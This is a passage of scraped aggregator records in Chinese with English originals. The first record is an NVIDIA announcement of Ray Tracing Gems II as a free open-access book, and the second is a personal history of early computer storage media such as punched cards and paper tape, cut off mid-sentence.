"\u8fd9\u672c\u5f00\u653e\u83b7\u53d6\u4e66\u7c4d\u662f\u4efb\u4f55\u5bf9\u5b9e\u65f6\u6e32\u67d3\u611f\u5174\u8da3\u7684\u4eba\u7684\u5fc5\u5907\u4e4b\u4e66\u3002\u5149\u7ebf\u8ffd\u8e2a\u662f\u6e38\u620f\u56fe\u5f62\u7684\u5723\u676f\uff0c\u5b83\u6a21\u62df\u5149\u7684\u7269\u7406\u884c\u4e3a\uff0c\u4e3a\u5373\u4f7f\u662f\u89c6\u89c9\u6700\u5f3a\u70c8\u7684\u6e38\u620f\u5e26\u6765\u5b9e\u65f6\u3001\u7535\u5f71\u54c1\u8d28\u7684\u6e32\u67d3\u3002\u5149\u7ebf\u8ffd\u8e2a\u4e5f\u662f\u4e00\u79cd\u7528\u4e8e\u67b6\u6784\u5e94\u7528\u3001\u53ef\u89c6\u5316\u3001\u58f0\u97f3\u6a21\u62df\u3001\u6df1\u5ea6\u5b66\u4e60\u7b49\u7684\u57fa\u672c\u7b97\u6cd5\u3002\u8981\u8d62\u5f97 Ray Tracing Gems II \u7684\u9650\u91cf\u7248\u5370\u5237\u526f\u672c\uff0c\u8bf7\u5728\u6b64\u5904\u53c2\u52a0\u8d60\u54c1\u7ade\u8d5b\uff1ahttps://developer.nvidia.com/ray-tracing-gems-ii 2018 \u5e74\uff0c\u5b9e\u65f6\u5149\u7ebf\u8ffd\u8e2a\u8fdb\u5165\u6d88\u8d39\u7ea7 GPU \u786c\u4ef6\u548c\u8fc5\u901f\u786e\u7acb\u4e86\u81ea\u5df1\u4f5c\u4e3a\u672a\u6765\u5982\u4f55\u751f\u6210\u56fe\u50cf\u7684\u5173\u952e\u7ec4\u6210\u90e8\u5206\u3002\u73b0\u5728\uff0c\u4e09\u5e74\u540e\uff0c\u8be5\u786c\u4ef6\u7684\u7b2c\u4e8c\u6b21\u8fed\u4ee3\u53ef\u7528\uff0c\u4e3b\u6d41\u6e38\u620f\u673a\u652f\u6301\u5149\u7ebf\u8ffd\u8e2a\uff0c\u5e76\u4e14\u5df2\u7ecf\u5efa\u7acb\u4e86\u8de8\u5e73\u53f0 API \u6807\u51c6\u4ee5\u63a8\u52a8\u66f4\u5e7f\u6cdb\u7684\u91c7\u7528\u3002\u5f00\u53d1\u4eba\u5458\u548c\u7814\u7a76\u4eba\u5458\u4e00\u76f4\u5fd9\u4e8e\u53d1\u660e\uff08\u548c\u91cd\u65b0\u53d1\u660e\uff09\u7b97\u6cd5\uff0c\u4ee5\u5229\u7528\u8fd9\u4e9b\u8fdb\u6b65\u521b\u9020\u7684\u65b0\u53ef\u80fd\u6027\u3002\u5728\u6b64\u8fc7\u7a0b\u4e2d\u53d1\u73b0\u7684\u77e5\u8bc6\u201c\u5b9d\u77f3\u201d\u5c31\u662f\u60a8\u5c06\u5728 Ray Tracing Gems II \u4e2d\u627e\u5230\u7684\u4e1c\u897f\u3002\u5728\u6f5c\u5165\u5b9d\u5e93\u4e4b\u524d\uff0c\u6211\u4eec\u60f3\u786e\u4fdd\u60a8\u4e86\u89e3\u4ee5\u4e0b\u5185\u5bb9\uff1a \u5f00\u653e\u83b7\u53d6\u5185\u5bb9\u5141\u8bb8\u60a8\u81ea\u7531\u590d\u5236\u548c\u91cd\u65b0\u5206\u53d1\u4efb\u4f55\u7ae0\u8282\u6216\u6574\u672c\u4e66\uff0c\u53ea\u8981\u60a8\u7ed9\u51fa\u9002\u5f53\u7684\u4fe1\u7528\u5e76\u4e14\u4e0d\u5c06\u5176\u7528\u4e8e\u5546\u4e1a\u7528\u9014\u76ee\u7684\u3002\u5177\u4f53\u8bb8\u53ef\u662f\u77e5\u8bc6\u5171\u4eab\u7f72\u540d 4.0 \u56fd\u9645\u8bb8\u53ef\uff08CC-BY-NC-ND\uff09\u3002\u6211\u4eec\u8fd9\u6837\u505a\u662f\u4e3a\u4e86\u8ba9\u4f5c\u8005\u548c\u5176\u4ed6\u6240\u6709\u4eba\u90fd\u80fd\u5c3d\u53ef\u80fd\u5feb\u901f\u3001\u5e7f\u6cdb\u548c\u516c\u5e73\u5730\u4f20\u64ad\u672c\u4e66\u4e2d\u7684\u4fe1\u606f\u3002\u50cf\u8fd9\u6837\u5199\u4e00\u672c\u9009\u96c6\u98ce\u683c\u7684\u4e66\u662f\u4e00\u79cd\u96c6\u4f53\u4fe1\u4ef0\u7684\u884c\u4e3a\u3002\u76f8\u4fe1\u4f5c\u8005\u3001\u7f16\u8f91\u3001\u51fa\u7248\u5546\u548c\u65e5\u7a0b\u5b89\u6392\u90fd\u4f1a\u6c47\u805a\u5728\u4e00\u8d77\uff0c\u4e3a\u8bfb\u8005\u5e26\u6765\u6709\u4ef7\u503c\u7684\u7ed3\u679c\u3002\u5728\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u8fd9\u662f\u4e00\u9879\u8270\u5de8\u7684\u4efb\u52a1\uff0c\u4f46\u8fc7\u53bb\u4e00\u5e74\u534a\u7684\u65f6\u95f4\u5374\u4e00\u70b9\u4e5f\u4e0d\u201c\u6b63\u5e38\u201d\u3002\u8fd9\u672c\u4e66\u7684\u53c2\u4e0e\u53f7\u53ec\u662f\u5728 2019 \u5e74 11 \u6708\u4e0b\u65ec\u53d1\u5e03\u7684\uff0c\u5f53\u65f6 COVID-19 \u75c5\u6bd2\u5f00\u59cb\u5728\u4e9a\u6d32\u51fa\u73b0\u3002\u5728\u6b64\u540e\u7684 18 \u4e2a\u6708\u4e2d\uff0c\u767e\u5e74\u4e00\u9047\u7684\u6d41\u884c\u75c5\u6fc0\u589e\u3002\u5b83\u7684\u5f71\u54cd\u5df2\u7ecf\u89e6\u53ca\u5730\u7403\u4e0a\u7684\u6bcf\u4e00\u4e2a\u4eba\u2014\u2014\u800c\u4e14\u5b83\u8fd8\u6ca1\u6709\u7ed3\u675f\u3002\u6b63\u5982\u6211\u4eec\u6240\u77e5\uff0c\u8be5\u75c5\u6bd2\u593a\u53bb\u4e86\u751f\u547d\uff0c\u7834\u574f\u4e86\u751f\u8ba1\uff0c\u5e76\u7834\u574f\u4e86\u751f\u6d3b\u65b9\u5f0f\u3002\u6211\u4eec\u575a\u4fe1\u51a0\u72b6\u75c5\u6bd2\u4f1a\u88ab\u514b\u670d\uff0c\u6211\u4eec\u63a8\u8fdf\u4e86\u8fd9\u672c\u4e66\u3002\u968f\u7740\u65f6\u95f4\u7684\u63a8\u79fb\uff0c\u75ab\u82d7\u7684\u5f00\u53d1\u53d6\u5f97\u4e86\u98de\u901f\u7684\u8fdb\u5c55\uff0c\u9694\u79bb\u4e2d\u7684\u8fdc\u7a0b\u5de5\u4f5c\u6210\u4e3a\u4e86\u4e00\u79cd\u65b0\u7684\u751f\u6d3b\u4e3b\u98df\uff0c\u4f5c\u8005\u4eec\u518d\u6b21\u5f00\u59cb\u5199\u8ba1\u7b97\u673a\u56fe\u5f62\u5b66\u3002\u56e0\u6b64\uff0c\u8fd9\u672c\u4e66\u5b8c\u5168\u662f\u5728\u9694\u79bb\u671f\u95f4\u7f16\u5199\u7684\u3002\u6211\u4eec\u771f\u8bda\u5730\u611f\u8c22\u4f5c\u8005\u7684\u70ed\u60c5\u548c\u5949\u732e\u7cbe\u795e\u2014\u2014\u4ee5\u53ca\u4fe1\u5ff5\u2014\u2014\u6240\u6709\u8fd9\u4e9b\u4f7f\u8fd9\u672c\u4e66\u5728\u7279\u6b8a\u60c5\u51b5\u4e0b\u6210\u4e3a\u53ef\u80fd\u3002\u53c2\u52a0 8 \u6708 9 \u65e5\u81f3 13 \u65e5\u7684 SIGGRAPH 2021 \u4f1a\u8bae\uff0c\u4ee5\u865a\u62df\u65b9\u5f0f\u6df1\u5165\u4e86\u89e3\u56fe\u5f62\u9886\u57df\u7684\u6700\u65b0\u521b\u65b0\u3002\u521b\u4f5c\u8005\u3001\u5b66\u751f\u3001\u7814\u7a76\u4eba\u5458\u548c\u5176\u4ed6\u4e13\u4e1a\u4eba\u58eb\u53ef\u4ee5\u4f53\u9a8c AI \u5982\u4f55\u6539\u53d8\u56fe\u5f62\u7684\u672a\u6765\uff0c\u4ece\u6a21\u62df\u5230\u4ea4\u4e92\u5f0f\u534f\u4f5c\u548c\u521b\u610f\u5de5\u5177\u3002\u5e76\u4e14\uff0c\u72ec\u5bb6\u4e86\u89e3 NVIDIA Research\u3001NVIDIA Omniverse \u4ee5\u53ca\u8bbe\u8ba1\u548c\u53ef\u89c6\u5316\u89e3\u51b3\u65b9\u6848\u5982\u4f55\u63a8\u52a8\u56fe\u5f62\u5de5\u4f5c\u6d41\u548c GPU \u52a0\u901f\u8f6f\u4ef6\u7684\u5148\u8fdb\u7a81\u7834\u3002\u4f7f\u7528\u4ee3\u7801 NVIDIA21 \u83b7\u5f97\u514d\u8d39\u7684\u57fa\u672c\u901a\u884c\u8bc1\u3002", "note_en": "This Open Access book is a must-have for anyone interested in real-time rendering. Ray tracing is the holy grail of gaming graphics, simulating the physical behavior of light to bring real-time, cinematic-quality rendering to even the most visually intense games. Ray tracing is also a fundamental algorithm used for architecture applications, visualization, sound simulation, deep learning, and more.\n To win a limited edition print copy of\u00a0 Ray Tracing Gems II, enter the giveaway contest here:\u00a0 https://developer.nvidia.com/ray-tracing-gems-ii\n  In 2018, real-time ray tracing arrived in consumer GPU hardware and swiftly established itself as a key component of how images would be generated moving forward. Now, three years later, the second iteration of this hardware is available, mainstream game consoles support ray tracing, and cross-platform API standards have been established to drive even wider adoption. Developers and researchers have been busy inventing (and reinventing) algorithms to take advantage of the new possibilities created by these advancements. The \u201cgems\u201d of knowledge discovered during this process are what you will find in   Ray Tracing Gems II .\n Before diving into the treasure trove, we want to make sure you know the following:\n  Open access content allows you to freely copy and redistribute any chapter, or the whole book, as long as you give appropriate credit and you are not using it for commercial purposes. The specific license is the   Creative Commons Attribution 4.0 International License (CC-BY-NC-ND) . We put this in place so that authors, and everyone else, can disseminate the information in this volume as quickly, widely, and equitably as possible.\n Writing an anthology style book, such as this, is an act of collective faith. Faith that the authors, editors, publisher, and schedules all converge to produce a worthwhile result for readers. Under normal circumstances this is a difficult task, but the past year and a half has been anything but \u201cnormal\u201d. This book\u2019s call for participation was posted in late November 2019, just as the COVID-19 virus began to emerge in Asia. In the 18 months since, a once-in-a-century pandemic has surged. Its impact has touched every person on Earth \u2013 and it is not yet over. The virus has taken lives, battered livelihoods, and broken the way of life as we knew it. We postponed this book with the quiet conviction that the coronavirus would be overcome. As time passed, the development of vaccines made breakneck progress, remote work in quarantine became a new staple of life, and authors began to write about computer graphics again. As a result, this book was written entirely during quarantine. We sincerely thank the authors for their passion and dedication \u2013 and faith \u2013 all of which made this book possible under extraordinary circumstances.\n  Join us August 9-13 at the SIGGRAPH 2021 conference to virtually dive into the latest innovations in graphics. Creators, students, researchers, and other professionals can experience how AI is transforming the future of graphics, from simulation to interactive collaboration and creative tools. And, get an exclusive look at how NVIDIA Research, NVIDIA Omniverse, and design and visualization solutions are driving advanced breakthroughs in graphics workflows and GPU-accelerated software. Get a free basic pass with code NVIDIA21.", "posttime": "2021-08-05 20:53:29", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u4e0b\u8f7d,\u514d\u8d39,\u8ffd\u8e2a,tracing,\u4f5c\u8005", "title": "\u5149\u7ebf\u8ffd\u8e2a\u5b9d\u77f3 II \u53ef\u514d\u8d39\u4e0b\u8f7d", "title_en": "Ray Tracing Gems II available as free download", "transed": 1, "url": "https://developer.nvidia.com/blog/ray-tracing-gems-ii-available-today-as-free-digital-download/", "via": "", "real_tags": ["\u4e0b\u8f7d", "\u514d\u8d39", "\u8ffd\u8e2a", "tracing", "\u4f5c\u8005"]}, {"category": "", "categoryclass": "", "imagename": "14ab13e523f4406b591342fbcd2c8c81.jpeg", "infoid": 1071332, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u5728\u672c\u6587\u4e2d\u82b1\u8d39\u5927\u91cf\u65f6\u95f4\u6765\u60ca\u53f9\u8ba1\u7b97\u673a\u5b58\u50a8\u4e0e\u8fc7\u53bb\u76f8\u6bd4\u53d8\u5f97\u591a\u4e48\u5c0f\u5de7\u548c\u5ec9\u4ef7\uff0c\u8fd9\u5f88\u8bf1\u4eba\u3002 1980 \u5e74\u4ee3\uff0c\u6211\u5728 Digital Equipment Corporation \u5de5\u4f5c\u65f6\uff0c\u6211\u7684\u7b2c\u4e00\u4efd\u5de5\u4f5c\u662f\u4e3a\u5927\u578b\u8ba1\u7b97\u673a\u8bbe\u8ba1\u5b58\u50a8\u5668\u3002\u6211\u4eec\u6b63\u5728\u6784\u5efa\u7684\u7cfb\u7edf\u7406\u8bba\u4e0a\u6700\u591a\u53ef\u4ee5\u6709 1GB \u7684\u5185\u5b58\uff0c\u4f46\u5f53\u65f6\u6211\u4eec\u5632\u7b11\u8fd9\u4e2a\u60f3\u6cd5\uff0c\u56e0\u4e3a\u5b83\u9700\u8981\u591a\u4e2a\u51b0\u7bb1\u5927\u5c0f\u7684\u673a\u67dc\u548c\u6570\u767e\u4e07\u7f8e\u5143\u6765\u6784\u5efa\u5b83\uff0c\u800c\u4e14\u8c01\u9700\u8981 1GB \u7684\u5185\u5b58\uff0c\u65e0\u8bba\u5982\u4f55?\u5f53\u7136\uff0c\u73b0\u5728\u4f60\u529e\u516c\u684c\u62bd\u5c49\u540e\u9762\u7684\u4e00\u4e2a\u53ea\u6709 1GB \u7684 USB \u9a71\u52a8\u5668\u56e0\u4e3a\u592a\u5c0f\u800c\u88ab\u6254\u6389\u4e86\uff0c\u5728\u8d85\u5e02\u6536\u94f6\u53f0\u53ef\u4ee5\u627e\u5230\u5408\u9002\u7684\u66ff\u4ee3\u54c1\uff0c\u4ef7\u683c\u4f4e\u4e8e 10 \u7f8e\u5143\u3002\u6211\u8ba4\u4e3a\u5c3d\u7ba1\u8fd9\u662f\u6211\u5c06\u81f4\u529b\u4e8e\u8c08\u8bba\u8fd9\u4e00\u975e\u51e1\u8fdb\u6b65\u7684\u6240\u6709\u65f6\u95f4\u3002\u5c3d\u7ba1\u6bcf\u6b21\u60f3\u5230\u6bd4\u8f83\u65f6\u5b83\u4ecd\u7136\u8ba9\u6211\u611f\u5230\u56f0\u60d1\uff0c\u4f46\u8fd9\u662f\u4e00\u4e2a\u5f7b\u5e95\u6db5\u76d6\u7684\u4e3b\u9898\u3002\u76f8\u53cd\uff0c\u6211\u60f3\u56de\u6eaf\u5230\u66f4\u8fdc\u7684\u5730\u65b9\uff0c\u770b\u770b\u6bd4\u6211\u901a\u5e38\u5199\u7684\uff08\u65e0\u53ef\u5426\u8ba4\u7684\u65e7\uff09\u4e1c\u897f\u66f4\u53e4\u8001\u7684\u5b58\u50a8\u7cfb\u7edf\u3002\u5176\u4e2d\u4e00\u4e9b\u662f\u6211\u5b9e\u9645\u4f7f\u7528\u8fc7\u7684\uff0c\u4f46\u6709\u4e9b\u662f\u6211\u591a\u5e74\u6765\u624d\u521a\u521a\u4e86\u89e3\u5230\u7684\u3002\u7eb8\u5f20\u4f5c\u4e3a\u5b58\u50a8\u4ecb\u8d28\u5df2\u7ecf\u5b58\u5728\u5f88\u957f\u65f6\u95f4\u4e86\u3002\u63a7\u5236\u94a2\u7434\u7b49\u4e50\u5668\u7684\u7eb8\u5377\u53ef\u4ee5\u8ffd\u6eaf\u5230 19 \u4e16\u7eaa\u4e2d\u53f6\u3002 IBM \u5f00\u59cb\u5236\u9020\u673a\u5668\uff0c\u8be5\u673a\u5668\u6539\u8fdb\u4e86 1800 \u5e74\u4ee3\u66f4\u8001\u7684\u7eb8\u5361\u5236\u8868\u673a\uff0c\u5c06\u73b0\u6709 22 \u5217\u5361\u7247\u7684\u5c3a\u5bf8\u548c\u5b58\u50a8\u91cf\u6269\u5927\u5230 80\u3002\u4ed6\u4eec\u8fd8\u5c06\u6cbf\u9014\u7684\u5b54\u4ece\u5706\u5f62\u6539\u4e3a\u77e9\u5f62\uff0c\u5e76\u4e14IBM \u6253\u5b54\u5361\u8bde\u751f\u4e86\u3002 \uff08\u53e6\u5916\uff0c\u6709\u8da3\u7684\u4e8b\u5b9e\uff0c\u65e7\u7684 CRT \u7ec8\u7aef\u6709 80 \u5217\u6587\u672c\u5b57\u7b26\u7684\u539f\u56e0\uff09\u8fd9\u79cd\u683c\u5f0f\u7edf\u6cbb\u4e86\u4ece 1920 \u5e74\u4ee3\u4e00\u76f4\u5230 1970 \u5e74\u4ee3\u7684\u65e9\u671f\u4fe1\u606f\u65f6\u4ee3\u3002 \uff08IBM \u5728\u4e0a\u9762\u7684\u94fe\u63a5\u4e2d\u8bf4\u8fd9\u4e9b\u5361\u7247\u5b58\u50a8\u4e86 20 \u4e16\u7eaa\u4e0a\u534a\u53f6\u7684\u6240\u6709\u4e16\u754c\u4fe1\u606f\uff0c\u4f46\u6211\u8ba4\u4e3a\u4ed6\u4eec\u5fd8\u8bb0\u4e86\u4e66\u7c4d\u3002\uff09\u6211\u5728 COBOL \u8bfe\u7a0b\u4e2d\u66fe\u77ed\u6682\u5730\u5728\u8fd9\u4e9b\u5361\u7247\u4e0a\u7f16\u5199\u7a0b\u5e8f\u5728\u6211\u4eec\u9ad8\u4e2d\u7684 70 \u5e74\u4ee3\u3002\u5230\u90a3\u65f6\uff0c\u4f7f\u7528\u5361\u7247\u4f5c\u4e3a\u7f16\u7a0b\u5b58\u50a8\u4ecb\u8d28\u5df2\u7ecf\u8fc7\u65f6\u4e86\uff0c\u4f46\u5728\u6211\u6240\u5728\u7684\u4e0d\u592a\u5148\u8fdb\u7684\u516c\u7acb\u5b66\u6821\u7cfb\u7edf\u4e2d\u4ecd\u7136\u5b58\u5728\u3002\u6211\u8bb0\u5f97\u7684\u4e24\u4ef6\u4e8b\u662f\uff0c\u9996\u5148\uff0c\u72af\u4e86\u4e00\u4e2a\u9519\u8bef\uff0c\u4e0d\u5141\u8bb8\u5220\u9664\u952e\u6765\u6253\u5b54\uff0c\u4f60\u521a\u5f00\u59cb\u4e00\u5f20\u65b0\u5361\u3002\u7b2c\u4e8c\u4e2a\u662f\u5982\u679c\u4f60\u653e\u4e0b\u4f60\u7684\u5361\u7247\u7ec4\u4f1a\u53d1\u751f\u4ec0\u4e48\u3002\u7a0b\u5e8f\u7684\u6bcf\u4e00\u884c\u90fd\u4ee5\u968f\u673a\u987a\u5e8f\u6563\u5e03\u5230\u5730\u677f\u4e0a\uff0c\u91cd\u65b0\u6392\u5e8f\u5b83\u4eec\u662f\u4e00\u79cd\u75db\u82e6\u3002\u6bcf\u4e2a\u7a0b\u5e8f\u8bed\u53e5\u90fd\u4f1a\u5728\u5361\u7247\u4e0a\u6709\u4e00\u4e2a\u884c\u53f7\uff0c\u56e0\u6b64\u53ef\u4ee5\u8ba1\u7b97\u51fa\u6765\uff0c\u4f46\u662f\u9605\u8bfb\u6570\u767e\u5f20\u5361\u7247\u5e76\u5c06\u5b83\u4eec\u6d17\u724c\u662f\u4e4f\u5473\u7684\u3002\n\u5982\u679c\u5e78\u8fd0\u7684\u8bdd\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528 IBM \u5361\u7247\u5206\u7c7b\u673a\u4e4b\u7c7b\u7684\u8bbe\u5907\u6765\u5b8c\u6210\u8fd9\u9879\u5de5\u4f5c\uff0c\u4f46\u8fd9\u79cd\u5173\u952e\u7684\u6570\u636e\u5904\u7406\u4e2d\u5fc3\u8bbe\u5907\u4e0d\u592a\u53ef\u80fd\u7528\u4e8e\u60a8\u91cd\u65b0\u7ec4\u88c5\u5361\u7247\u7ec4\u3002\u56e0\u6b64\uff0c\u4e13\u4e1a\u4eba\u58eb\u62ff\u4e86\u4e00\u4e2a\u5de8\u5927\u7684\u9b54\u6cd5\u8bb0\u53f7\u7b14\uff0c\u5728\u724c\u7ec4\u7684\u4fa7\u9762\u753b\u4e86\u4e00\u6761\u659c\u6761\u7eb9\uff0c\u8fd9\u6837\u4f60\u5c31\u53ef\u4ee5\u76f4\u89c2\u5730\u53d1\u73b0\u4e71\u5e8f\u7684\u724c\u3002\u6211\u5728 70 \u5e74\u4ee3\u82b1\u4e86\u66f4\u591a\u65f6\u95f4\u4f7f\u7528\u53e6\u4e00\u79cd\u7eb8\u5f20\u683c\u5f0f\uff0c\u5373\u7eb8\u5e26\u3002\u7eb8\u5e26\u6253\u5b54\u673a\u662f\u4e00\u79cd\u5e38\u89c1\u7684\u5916\u56f4\u8bbe\u5907\uff0c\u5b83\u8fde\u63a5\u5230\u7535\u4f20\u6253\u5b57\u673a\uff0c\u4f8b\u5982\u6211\u5728\u5b66\u6821\u7528\u6765\u7f16\u5199 BASIC \u7a0b\u5e8f\u7684 Model 33\u3002\u6253\u5b54\u5668\u548c\u8bfb\u53d6\u5668\u90fd\u663e\u793a\u4e3a\u76f8\u5f53\u4e8e /dev \u7684\u8bbe\u5907\uff0c\u5e76\u4e14\u4e0e UNIX \u975e\u5e38\u76f8\u4f3c\uff0c\u60a8\u53ef\u4ee5\u5c06\u7a0b\u5e8f\u91cd\u5b9a\u5411\u5230\u7eb8\u5e26\u4e0a\u6216\u4ece\u7eb8\u5e26\u4e0a\u91cd\u5b9a\u5411\u3002\u7531\u4e8e\u673a\u68b0\u901f\u5ea6\u9650\u5236\u4ee5\u53ca\u4f7f\u7528\u7684\u76f8\u5f53\u57fa\u672c\u7684\u7f16\u7801\uff086 \u4f4d ASCII\uff09\uff0c\u6253\u5b54\u548c\u8bfb\u53d6\u901f\u5ea6\u975e\u5e38\u6162\u3002\u4f46\u5b83\u662f\u4e00\u79cd\u771f\u6b63\u7684\u8bfb/\u5199\u683c\u5f0f\uff0c\u5373\u4f7f\u60a8\u65e0\u6cd5\u64e6\u9664\u548c\u91cd\u590d\u4f7f\u7528\u4ecb\u8d28\u3002\u7531\u4e8e\u4e0d\u6d89\u53ca\u6253\u5b57\uff0c\u56e0\u6b64\u6bd4\u5361\u7247\u66f4\u5bb9\u6613\u7ba1\u7406\u3002\u6211\u8981\u63d0\u5230\u7684\u6700\u540e\u4e00\u4e2a\u7eb8\u5f20\u5b58\u50a8\u8bbe\u5907\u662f\u6253\u5370\u673a\u3002\u60a8\u53ef\u80fd\u4e0d\u4f1a\u5c06\u6253\u5370\u673a\u89c6\u4e3a\u5b58\u50a8\u8bbe\u5907\uff0c\u4f46\u5728 70 \u5e74\u4ee3\u751a\u81f3 80 \u5e74\u4ee3\uff0c\u901a\u8fc7\u6253\u5370\u6765\u5171\u4eab\u7a0b\u5e8f\u975e\u5e38\u666e\u904d\u3002\u6253\u5370\u673a\u662f\u201c\u4f5c\u5bb6\u201d\uff0c\u800c\u201c\u8bfb\u8005\u201d\u662f\u5fc5\u987b\u91cd\u65b0\u8f93\u5165\u7684\u4eba\uff0c\u8fd9\u5f53\u7136\u5f88\u6162\u3002\u4f46\u5f53\u65f6\u7684\u8bb8\u591a\u6742\u5fd7\u548c\u4e66\u7c4d\u90fd\u4f1a\u51fa\u7248\u5370\u5237\u7248\u7a0b\u5e8f\u4e0e\u8bfb\u8005\u5206\u4eab\uff0c\u6211\u82b1\u4e86\u51e0\u4e2a\u5c0f\u65f6\u4ece\u5370\u5237\u7248\u4e2d\u8f93\u5165 BASIC \u7a0b\u5e8f\uff0c\u7136\u540e\u8bd5\u56fe\u627e\u51fa\u6240\u6709\u9519\u522b\u5b57\u3002\u6211\u6700\u8fd1\u53d1\u73b0\u4e86\u6211 17 \u5c81\u65f6\u5199\u7684\u4e00\u4e2a\u7a0b\u5e8f\u7684\u6253\u5370\u8f93\u51fa\uff0c\u5b83\u88ab\u56f0\u5728 80 \u5e74\u4ee3\u7684\u65e7\u8ba1\u7b97\u673a\u6e38\u620f\u4e16\u754c\u6742\u5fd7\u4e2d\u3002\u8fd9\u662f\u6211\u5199\u7684\u4e00\u4e2a\u6e38\u620f\uff0c\u6211\u51b3\u5b9a\u590d\u6d3b\u5b83\uff0c\u770b\u770b\u6211\u80fd\u4e0d\u80fd\u8ba9\u5b83\u8fd0\u884c\u3002 \uff08\u5267\u900f\u662f\uff0c\u6211\u505a\u5230\u4e86 - \u4f46\u6211\u5c06\u5728\u53e6\u4e00\u7bc7\u6587\u7ae0\u4e2d\u4ecb\u7ecd\u90a3\u4e2a\u3002\uff09\u6211\u89c9\u5f97\u7eb8\u5f20\u5b58\u50a8\u683c\u5f0f\u4ee4\u4eba\u60ca\u5947\u7684\u662f\u5b83\u7684\u957f\u5bff\u3002\u51e0\u5341\u5e74\u524d\u6253\u5b54\u7684\u5361\u7247\u7ec4\u548c\u7eb8\u5e26\u4ecd\u7136\u975e\u5e38\u53ef\u884c\uff0c\u53ea\u8981\u60a8\u80fd\u627e\u5230\u4e00\u79cd\u9605\u8bfb\u65b9\u5f0f\uff0c\u5e76\u4e14\u4efb\u4f55\u65f6\u5019\u90fd\u4e0d\u4f1a\u5f04\u6e7f\u3002\u7eb8\u4f5c\u4e3a\u673a\u68b0\u8ba1\u7b97\u673a\u65f6\u4ee3\u7684\u5b58\u50a8\u4ecb\u8d28\u975e\u5e38\u597d\uff0c\u4f46\u662f\u5f53 1940 \u5e74\u4ee3\u7535\u5b50\u8ba1\u7b97\u673a\u51fa\u73b0\u65f6\uff0c\u9700\u8981\u66f4\u5feb\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u81f3\u5c11\u5bf9\u4e8e\u4e3b\u5b58\u50a8\u5668\u6216\u201c\u5b58\u50a8\u201d\uff0c\u56e0\u4e3a\u5b83\u901a\u5e38\u88ab\u79f0\u4e3a\u201c\u5b58\u50a8\u201d\u7136\u540e\u3002\u5982\u679c\u60a8\u8ba4\u4e3a\u7a7f\u5b54\u5361\u662f\u5f53\u4eca\u7684\u5927\u5bb9\u91cf\u201c\u78c1\u76d8\u5b58\u50a8\u201d\uff0c\u90a3\u4e48\u5b83\u4ecd\u7136\u9700\u8981\u4e00\u4e2a\u66f4\u5c0f\u3001\u66f4\u5feb\u7684\u5b58\u50a8\u8bbe\u5907\u6765\u5b58\u50a8\u53ef\u4ee5\u8ddf\u4e0a\u5904\u7406\u5668\u7684\u7a0b\u5e8f\u548c\u6570\u636e\uff08\u4f8b\u5982\u4eca\u5929\u7684\u52a8\u6001\u5185\u5b58\u7cfb\u7edf\uff09 \uff09\u3002\u673a\u68b0\u89e3\u51b3\u65b9\u6848\u5df2\u7ecf\u8fc7\u65f6\uff0c\u800c\u7535\u5b50\u89e3\u51b3\u65b9\u6848\u51fa\u73b0\u4e86\u3002\u4f46\u662f\u5b58\u5728\u89c4\u6a21\u95ee\u9898\uff0c\u56e0\u4e3a\u96c6\u6210\u7535\u8def\u8fd8\u6709 20 \u5e74\u7684\u65f6\u95f4\uff0c\u751a\u81f3\u6676\u4f53\u7ba1\u8fd8\u6ca1\u6709\u53d1\u660e\u51fa\u6765\u3002\u53ef\u4ee5\u6784\u5efa\u7531\u7ba1\u5236\u6210\u7684\u5bc4\u5b58\u5668\u7535\u8def\uff0c\u4f46\u81f3\u5c11\u9700\u8981 4-5 \u4e2a\u7ba1\u548c\u76f8\u5173\u7684\u5206\u7acb\u5143\u4ef6\u6765\u5b58\u50a8\u5355\u4e2a\u4f4d\u3002\u8fd9\u901f\u5ea6\u5f88\u5feb\uff0c\u4f46\u9700\u8981\u5927\u91cf\u7a7a\u95f4\u548c\u5927\u91cf\u529f\u7387\u3002\u6570\u4ee5\u4e07\u8ba1\u7684\u7ba1\u5b50\u53ea\u662f\u4e3a\u4e86\u5b58\u50a8 1 \u5343\u5b57\u8282\u7684\u6570\u636e\uff0c\u9020\u6210\u5404\u79cd\u6210\u672c\u3001\u529f\u7387\u3001\u6563\u70ed\u548c\u53ef\u9760\u6027\u95ee\u9898\u3002\n\u5236\u9020\u66f4\u5c0f\u7684\u5b58\u50a8\u8bbe\u5907\u7684\u52a8\u673a\u5f88\u9ad8\uff0c\u56e0\u6b64\u4ed6\u4eec\u5bf9\u53ef\u4ee5\u5c06\u6240\u6709\u90e8\u5206\u4fdd\u7559\u4e00\u6bb5\u65f6\u95f4\u7684\u5730\u65b9\u8fdb\u884c\u4e86\u521b\u610f\u3002\u6700\u65e9\u7684\u89e3\u51b3\u65b9\u6848\u4e4b\u4e00\u662f\u4f7f\u7528\u7535\u7ebf\u3002\u7a0d\u5fae\u590d\u6742\u4e00\u70b9\uff0c\u4f46\u57fa\u672c\u4e0a\u662f\u4e00\u6839\u7535\u7ebf\u3002\u8fd9\u4e2a\u60f3\u6cd5\u662f\u57fa\u4e8e\u6ce2\u4f20\u64ad\u7684\u539f\u7406\uff0c\u5176\u4e2d\u7535\u8109\u51b2\u6cbf\u7740\u5bfc\u4f53\u4f20\u64ad\u9700\u8981\u65f6\u95f4\uff0c\u5982\u679c\u5bfc\u4f53\u8db3\u591f\u957f\uff0c\u4ee3\u8868\u6bd4\u7279\u7684\u51e0\u4e2a\u8109\u51b2\u53ef\u4ee5\u5728\u5b83\u4eec\u884c\u8fdb\u65f6\u5b58\u50a8\u5728\u5bfc\u7ebf\u4e2d\u3002\u8fd9\u4e2a\u6280\u672f\u9886\u57df\u4e5f\u88ab\u79f0\u4e3a\u4f20\u8f93\u7ebf\u7406\u8bba\uff0c\u5b83\u540e\u6765\u56f0\u6270\u7740\u50cf\u6211\u8fd9\u6837\u7684\u7cfb\u7edf\u5de5\u7a0b\u5e08\uff0c\u56e0\u4e3a\u4fe1\u53f7\u5728\u7535\u7ebf\u4e2d\u4f20\u64ad\u7684\u5f71\u54cd\u4f1a\u5bfc\u81f4\u5ef6\u8fdf\u751a\u81f3\u53cd\u5c04\uff0c\u4ece\u800c\u5bfc\u81f4\u5feb\u901f\u7535\u8def\u7684\u65f6\u5e8f\u548c\u4fe1\u53f7\u5b8c\u6574\u6027